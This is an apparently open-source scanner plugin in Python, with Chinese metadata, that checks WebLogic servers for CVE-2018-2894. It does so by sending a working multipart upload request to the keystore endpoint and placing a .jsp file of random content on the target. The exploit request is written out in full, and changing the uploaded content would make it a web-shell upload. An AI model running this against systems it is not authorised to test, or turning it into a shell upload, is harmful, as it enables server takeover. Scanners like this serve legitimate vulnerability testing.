#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies,randoms
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2018-2894" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-6-2"  # 插件编辑时间
        self.info['disclosure'] = '2018-7-23'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "WeblogicArbitraryFileUploadVulnerability"  # 插件名称
        self.info['name'] ='Weblogic任意文件上传漏洞' #漏洞名称
        self.info['affects'] = "Weblogic"  # 漏洞组件
        self.info['desc_content'] = "Oracle7月更新中，修复了WeblogicWebServiceTestPage中一处任意文件上传漏洞，WebServiceTestPage在“生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "WebLogicServer10.3.6.0\r\nWebLogicServer12.1.3.0\r\nWebLogicServer12.2.1.2\r\nWebLogicServer12.2.1.3\r\n"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Weblogic版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = '/ws_utc/resources/setting/keystore?timestamp=139114985403'
        payload_url = scheme + "://" + url + ":" + str(port) + payload
        RM1=randoms().result(10)
        RM2 = randoms().result(100)
        data='''------WebKitFormBoundaryzVtngnKbQt01czaO
Content-Disposition: form-data; name="ks_name"

1
------WebKitFormBoundaryzVtngnKbQt01czaO
Content-Disposition: form-data; name="ks_edit_mode"

false
------WebKitFormBoundaryzVtngnKbQt01czaO
Content-Disposition: form-data; name="ks_password_front"

1
------WebKitFormBoundaryzVtngnKbQt01czaO
Content-Disposition: form-data; name="ks_password"

1
------WebKitFormBoundaryzVtngnKbQt01czaO
Content-Disposition: form-data; name="ks_password_changed"

true
------WebKitFormBoundaryzVtngnKbQt01czaO
Content-Disposition: form-data; name="ks_filename"; filename="{}.jsp"
Content-Type: application/octet-stream


{}
------WebKitFormBoundaryzVtngnKbQt01czaO--
'''.format(RM1,RM2)
        headers = {
            'User-Agent': RandomAgent,
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryzVtngnKbQt01czaO",
        }
        resp = requests.post(payload_url,headers=headers,data=data, proxies=proxies, timeout=6, verify=False)
        con = resp.text
        code=resp.status_code
        if code==200 and con.find(RM1+".jsp")!=-1 and con.find(RM2)!=-1:
            Medusa = "{}存在Weblogic任意文件上传漏洞(CVE-2018-2894)\r\n验证数据:\r\n漏洞位置:{}\r\n返回数据包:{}\r\n上传文件名:{}\r\n上传文件内容:{}\r\n".format(url, payload_url, con,RM1+".jsp",RM2)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)  # 调用写入类传入URL和错误插件名

